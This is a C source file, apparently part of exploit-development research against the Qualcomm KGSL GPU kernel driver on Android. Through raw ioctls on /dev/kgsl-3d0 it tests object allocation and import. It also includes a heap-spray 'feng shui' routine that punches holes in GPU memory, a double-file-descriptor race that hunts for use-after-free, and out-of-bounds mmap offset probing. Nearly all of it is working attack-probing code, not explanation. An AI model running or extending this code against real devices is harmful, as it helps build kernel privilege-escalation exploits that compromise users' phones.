/*
 * KGSL Deep Exploitation Research
 * ================================
 *
 * Confirmed capabilities:
 * - GPU memory allocation: YES
 * - GPU memory mmap (write): YES
 * - Multiple FD operations: YES
 *
 * Research targets:
 * 1. GPU object manipulation
 * 2. Timestamp/fence operations
 * 3. GPU buffer import with arbitrary dmabuf
 * 4. Memory mapping tricks
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <setjmp.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/ashmem.h>

// KGSL IOCTL definitions
#define IOCTL_KGSL_DEVICE_GETPROPERTY 0x80200902
#define IOCTL_KGSL_GPUMEM_ALLOC 0xc018092f
#define IOCTL_KGSL_GPUOBJ_ALLOC 0xc0180938
#define IOCTL_KGSL_GPUOBJ_INFO 0xc0200939
#define IOCTL_KGSL_GPUOBJ_SET_INFO 0xc018093a
#define IOCTL_KGSL_GPU_COMMAND 0xc0580940
#define IOCTL_KGSL_GPUOBJ_IMPORT 0xc0280958
#define IOCTL_KGSL_GPUOBJ_SYNC 0xc0180956

// Property types
#define KGSL_PROP_DEVICE_INFO 1
#define KGSL_PROP_GPU_RESET_STAT 4

// Structures
struct kgsl_devinfo
{
    uint32_t device_id;
    uint32_t chip_id;
    uint32_t mmu_enabled;
    uint64_t gmem_gpubaseaddr;
    uint32_t gpu_id;
    uint32_t gmem_sizebytes;
};

struct kgsl_device_getproperty
{
    uint32_t type;
    uint32_t padding;
    void *value;
    uint32_t sizebytes;
};

struct kgsl_gpumem_alloc
{
    uint64_t gpuaddr;
    uint64_t size;
    uint32_t flags;
    uint32_t padding;
};

struct kgsl_gpuobj_alloc
{
    uint64_t size;
    uint64_t flags;
    uint64_t va_len;
    uint32_t id;
    uint64_t metadata_len;
    uint64_t metadata;
};

struct kgsl_gpuobj_info
{
    uint64_t gpuaddr;
    uint64_t flags;
    uint64_t size;
    uint64_t va_len;
    uint64_t va_addr;
    uint32_t id;
    uint32_t padding;
};

struct kgsl_gpuobj_set_info
{
    uint64_t flags;
    uint64_t metadata;
    uint32_t id;
    uint32_t metadata_len;
    uint32_t type;
    uint32_t padding;
};

struct kgsl_gpuobj_import
{
    uint64_t priv;
    uint64_t priv_len;
    uint64_t flags;
    uint32_t type;
    uint32_t id;
};

struct kgsl_gpuobj_sync_obj
{
    uint64_t offset;
    uint64_t length;
    uint32_t id;
    uint32_t op;
};

struct kgsl_gpuobj_sync
{
    struct kgsl_gpuobj_sync_obj *objs;
    uint32_t obj_len;
    uint32_t count;
};

struct kgsl_gpu_command
{
    uint64_t flags;
    uint64_t cmdlist;
    uint64_t cmdsize;
    uint64_t objlist;
    uint64_t objsize;
    uint64_t synclist;
    uint64_t syncsize;
    uint32_t context_id;
    uint32_t timestamp;
    uint32_t numcmds;
    uint32_t numobjs;
    uint32_t numsyncs;
    uint32_t padding;
};

static sigjmp_buf jmp_env;
static volatile sig_atomic_t sig_received = 0;
int g_fd = -1;

void sig_handler(int sig)
{
    sig_received = sig;
    siglongjmp(jmp_env, 1);
}

void hexdump(const void *data, size_t size)
{
    const uint8_t *p = data;
    for (size_t i = 0; i < size && i < 64; i++)
    {
        if (i % 16 == 0)
            printf("  %04zx: ", i);
        printf("%02x", p[i]);
        if ((i + 1) % 16 == 0)
            printf("\n");
        else if ((i + 1) % 4 == 0)
            printf(" ");
    }
    if (size % 16 != 0)
        printf("\n");
}

// ============================================================================
// Test 1: GPU Object Allocation Analysis
// ============================================================================
void test_gpuobj_alloc(void)
{
    printf("\n=== GPU Object Allocation ===\n");

    // Try GPUOBJ_ALLOC with various flags
    uint64_t flags_to_try[] = {
        0,
        0x1,   // KGSL_MEMFLAGS_GPUREADONLY
        0x2,   // KGSL_MEMFLAGS_GPUWRITEONLY
        0x4,   // KGSL_MEMFLAGS_GPUEXEC
        0x8,   // KGSL_MEMFLAGS_SECURE
        0x100, // KGSL_MEMFLAGS_USERMEM_PMEM
        0x200, // KGSL_MEMFLAGS_USERMEM_ASHMEM
        0x400, // KGSL_MEMFLAGS_USERMEM_ADDR
        0x800, // KGSL_MEMFLAGS_USERMEM_ION
    };

    for (int i = 0; i < sizeof(flags_to_try) / sizeof(flags_to_try[0]); i++)
    {
        struct kgsl_gpuobj_alloc alloc = {0};
        alloc.size = 0x1000;
        alloc.flags = flags_to_try[i];

        int ret = ioctl(g_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc);
        printf("  flags=0x%04lx: ret=%d id=%u errno=%d\n",
               flags_to_try[i], ret, alloc.id, ret < 0 ? errno : 0);
    }
}

// ============================================================================
// Test 2: GPU Object Info Queries
// ============================================================================
void test_gpuobj_info(void)
{
    printf("\n=== GPU Object Info ===\n");

    // First allocate using old method
    struct kgsl_gpumem_alloc alloc = {0};
    alloc.size = 0x1000;

    if (ioctl(g_fd, IOCTL_KGSL_GPUMEM_ALLOC, &alloc) < 0)
    {
        printf("[-] Allocation failed\n");
        return;
    }
    printf("[+] Allocated: gpuaddr=0x%lx\n", alloc.gpuaddr);

    // Try to get info using various IDs
    for (uint32_t id = 0; id < 5; id++)
    {
        struct kgsl_gpuobj_info info = {0};
        info.id = id;

        int ret = ioctl(g_fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
        if (ret == 0)
        {
            printf("[+] ID %u: gpuaddr=0x%lx size=0x%lx flags=0x%lx va=0x%lx\n",
                   id, info.gpuaddr, info.size, info.flags, info.va_addr);
        }
    }
}

// ============================================================================
// Test 3: GPU Object Import (from dmabuf)
// ============================================================================
void test_gpuobj_import(void)
{
    printf("\n=== GPU Object Import ===\n");

    // Create ashmem as dmabuf-like source
    int ashmem_fd = open("/dev/ashmem", O_RDWR);
    if (ashmem_fd < 0)
    {
        printf("[-] Cannot open ashmem\n");
        return;
    }

    ioctl(ashmem_fd, ASHMEM_SET_SIZE, 0x2000);
    void *ashmem_map = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE,
                            MAP_SHARED, ashmem_fd, 0);
    if (ashmem_map == MAP_FAILED)
    {
        close(ashmem_fd);
        return;
    }

    // Write marker
    *(uint64_t *)ashmem_map = 0xDEADBEEFCAFEBABEULL;
    printf("[+] Ashmem created: fd=%d map=%p\n", ashmem_fd, ashmem_map);

    // Import types to try
    uint32_t import_types[] = {
        0, // KGSL_USER_MEM_TYPE_PMEM
        1, // KGSL_USER_MEM_TYPE_ASHMEM
        2, // KGSL_USER_MEM_TYPE_ADDR
        3, // KGSL_USER_MEM_TYPE_ION
        4, // KGSL_USER_MEM_TYPE_DMABUF
    };

    for (int t = 0; t < sizeof(import_types) / sizeof(import_types[0]); t++)
    {
        struct kgsl_gpuobj_import imp = {0};
        imp.type = import_types[t];

        // Different priv data based on type
        if (import_types[t] == 1)
        {
            // ASHMEM: priv = fd
            imp.priv = (uint64_t)ashmem_fd;
            imp.priv_len = sizeof(int);
        }
        else if (import_types[t] == 4)
        {
            // DMABUF: priv = fd
            imp.priv = (uint64_t)ashmem_fd;
            imp.priv_len = sizeof(int);
        }
        else if (import_types[t] == 2)
        {
            // ADDR: priv = user address
            imp.priv = (uint64_t)ashmem_map;
            imp.priv_len = 0x2000;
        }

        int ret = ioctl(g_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
        printf("  type=%u: ret=%d id=%u errno=%d\n",
               import_types[t], ret, imp.id, ret < 0 ? errno : 0);

        if (ret == 0 && imp.id != 0)
        {
            // Got valid ID! Try to get info
            struct kgsl_gpuobj_info info = {0};
            info.id = imp.id;
            if (ioctl(g_fd, IOCTL_KGSL_GPUOBJ_INFO, &info) == 0)
            {
                printf("      -> gpuaddr=0x%lx size=0x%lx\n", info.gpuaddr, info.size);
            }
        }
    }

    munmap(ashmem_map, 0x2000);
    close(ashmem_fd);
}

// ============================================================================
// Test 4: GPU Memory Spray (Heap Feng Shui Preparation)
// ============================================================================
void test_memory_spray(void)
{
    printf("\n=== GPU Memory Spray ===\n");

    struct
    {
        uint64_t gpuaddr;
        void *map;
    } allocs[100];

    int count = 0;
    for (int i = 0; i < 100; i++)
    {
        struct kgsl_gpumem_alloc alloc = {0};
        alloc.size = 0x1000;

        if (ioctl(g_fd, IOCTL_KGSL_GPUMEM_ALLOC, &alloc) < 0)
        {
            break;
        }

        uint64_t page_idx = (alloc.gpuaddr - 0x4000000000ULL) / 0x1000;
        uint64_t offset = (page_idx + 1) * 0x1000;
        void *map = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                         MAP_SHARED, g_fd, offset);

        allocs[count].gpuaddr = alloc.gpuaddr;
        allocs[count].map = map;
        count++;

        if (map != MAP_FAILED)
        {
            // Fill with pattern
            memset(map, 0x41 + (i % 26), 0x1000);
        }
    }

    printf("[+] Allocated %d GPU buffers\n", count);

    // Find gaps in allocation
    printf("[*] Address distribution:\n");
    for (int i = 0; i < count && i < 10; i++)
    {
        printf("    [%02d] 0x%lx -> %p\n", i, allocs[i].gpuaddr, allocs[i].map);
    }
    if (count > 10)
    {
        printf("    ... (%d more)\n", count - 10);
        for (int i = count - 3; i < count; i++)
        {
            printf("    [%02d] 0x%lx -> %p\n", i, allocs[i].gpuaddr, allocs[i].map);
        }
    }

    // Free alternating to create holes
    printf("[*] Creating holes (freeing even indices)...\n");
    for (int i = 0; i < count; i += 2)
    {
        if (allocs[i].map != MAP_FAILED)
        {
            munmap(allocs[i].map, 0x1000);
        }
        // Close would free GPU memory
    }

    // Cleanup remaining
    for (int i = 1; i < count; i += 2)
    {
        if (allocs[i].map != MAP_FAILED)
        {
            munmap(allocs[i].map, 0x1000);
        }
    }
}

// ============================================================================
// Test 5: Double-FD Race with Allocation/Free
// ============================================================================
void test_double_fd_race(void)
{
    printf("\n=== Double-FD Race Test ===\n");

    int fd1 = open("/dev/kgsl-3d0", O_RDWR);
    int fd2 = open("/dev/kgsl-3d0", O_RDWR);

    if (fd1 < 0 || fd2 < 0)
    {
        printf("[-] Cannot open multiple FDs\n");
        return;
    }
    printf("[+] fd1=%d fd2=%d\n", fd1, fd2);

    // Allocate on fd1
    struct kgsl_gpumem_alloc alloc1 = {0};
    alloc1.size = 0x1000;
    if (ioctl(fd1, IOCTL_KGSL_GPUMEM_ALLOC, &alloc1) < 0)
    {
        printf("[-] Alloc on fd1 failed\n");
        close(fd1);
        close(fd2);
        return;
    }
    printf("[+] fd1 allocated: 0x%lx\n", alloc1.gpuaddr);

    // Allocate on fd2
    struct kgsl_gpumem_alloc alloc2 = {0};
    alloc2.size = 0x1000;
    if (ioctl(fd2, IOCTL_KGSL_GPUMEM_ALLOC, &alloc2) < 0)
    {
        printf("[-] Alloc on fd2 failed\n");
        close(fd1);
        close(fd2);
        return;
    }
    printf("[+] fd2 allocated: 0x%lx\n", alloc2.gpuaddr);

    // Map both
    uint64_t offset1 = ((alloc1.gpuaddr - 0x4000000000ULL) / 0x1000 + 1) * 0x1000;
    uint64_t offset2 = ((alloc2.gpuaddr - 0x4000000000ULL) / 0x1000 + 1) * 0x1000;

    void *map1 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd1, offset1);
    void *map2 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd2, offset2);

    printf("[+] map1=%p map2=%p\n", map1, map2);

    if (map1 != MAP_FAILED)
    {
        *(uint64_t *)map1 = 0x1111111111111111ULL;
    }
    if (map2 != MAP_FAILED)
    {
        *(uint64_t *)map2 = 0x2222222222222222ULL;
    }

    // Close fd1 while keeping map1
    printf("[*] Closing fd1...\n");
    close(fd1);

    // Try to access map1
    sig_received = 0;
    if (sigsetjmp(jmp_env, 1) == 0)
    {
        uint64_t val = *(volatile uint64_t *)map1;
        printf("[?] map1 after fd1 close: 0x%lx\n", val);

        // Try to write
        *(volatile uint64_t *)map1 = 0xAAAAAAAAAAAAAAAAULL;
        val = *(volatile uint64_t *)map1;
        printf("[?] map1 after write: 0x%lx\n", val);
    }
    else
    {
        printf("[!] Signal %d accessing map1 after fd close\n", sig_received);
    }

    // Allocate new buffer on fd2 - might reuse same physical memory
    printf("[*] New allocation on fd2...\n");
    struct kgsl_gpumem_alloc alloc3 = {0};
    alloc3.size = 0x1000;
    if (ioctl(fd2, IOCTL_KGSL_GPUMEM_ALLOC, &alloc3) == 0)
    {
        printf("[+] fd2 new alloc: 0x%lx\n", alloc3.gpuaddr);

        // Check if same GPU address was reused
        if (alloc3.gpuaddr == alloc1.gpuaddr)
        {
            printf("[!!!] GPU address reused! Potential UAF!\n");
        }
    }

    // Cleanup
    if (map1 != MAP_FAILED)
        munmap(map1, 0x1000);
    if (map2 != MAP_FAILED)
        munmap(map2, 0x1000);
    close(fd2);
}

// ============================================================================
// Test 6: OOB Memory Probe via mmap offset manipulation
// ============================================================================
void test_oob_mmap(void)
{
    printf("\n=== OOB mmap Offset Test ===\n");

    struct kgsl_gpumem_alloc alloc = {0};
    alloc.size = 0x1000;

    if (ioctl(g_fd, IOCTL_KGSL_GPUMEM_ALLOC, &alloc) < 0)
    {
        printf("[-] Alloc failed\n");
        return;
    }
    printf("[+] Base allocation: 0x%lx\n", alloc.gpuaddr);

    uint64_t base_page_idx = (alloc.gpuaddr - 0x4000000000ULL) / 0x1000;
    uint64_t base_offset = (base_page_idx + 1) * 0x1000;

    printf("[*] Probing adjacent offsets...\n");

    // Try offsets before and after
    int64_t probes[] = {-0x10000, -0x1000, 0, 0x1000, 0x10000, 0x100000};

    for (int i = 0; i < sizeof(probes) / sizeof(probes[0]); i++)
    {
        uint64_t probe_offset = base_offset + probes[i];

        sig_received = 0;
        if (sigsetjmp(jmp_env, 1) == 0)
        {
            void *map = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                             MAP_SHARED, g_fd, probe_offset);
            if (map != MAP_FAILED)
            {
                uint64_t val = *(volatile uint64_t *)map;
                printf("  offset 0x%lx (diff %+ld): mapped at %p, val=0x%lx\n",
                       probe_offset, probes[i], map, val);
                munmap(map, 0x1000);
            }
            else
            {
                printf("  offset 0x%lx (diff %+ld): mmap failed errno=%d\n",
                       probe_offset, probes[i], errno);
            }
        }
        else
        {
            printf("  offset 0x%lx (diff %+ld): SIGNAL %d\n",
                   probe_offset, probes[i], sig_received);
        }
    }
}

// ============================================================================
// Main
// ============================================================================
int main(int argc, char **argv)
{
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    signal(SIGSEGV, sig_handler);
    signal(SIGBUS, sig_handler);

    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  KGSL Deep Exploitation Research                               ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n\n");

    g_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (g_fd < 0)
    {
        printf("[-] Cannot open KGSL: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] KGSL fd=%d\n", g_fd);

    // Get device info
    struct kgsl_devinfo devinfo = {0};
    struct kgsl_device_getproperty prop = {0};
    prop.type = KGSL_PROP_DEVICE_INFO;
    prop.value = &devinfo;
    prop.sizebytes = sizeof(devinfo);

    if (ioctl(g_fd, IOCTL_KGSL_DEVICE_GETPROPERTY, &prop) == 0)
    {
        printf("[+] GPU: chip_id=0x%x gpu_id=0x%x\n", devinfo.chip_id, devinfo.gpu_id);
    }

    test_gpuobj_alloc();
    test_gpuobj_info();
    test_gpuobj_import();
    test_memory_spray();
    test_double_fd_race();
    test_oob_mmap();

    close(g_fd);
    printf("\n=== Complete ===\n");
    return 0;
}
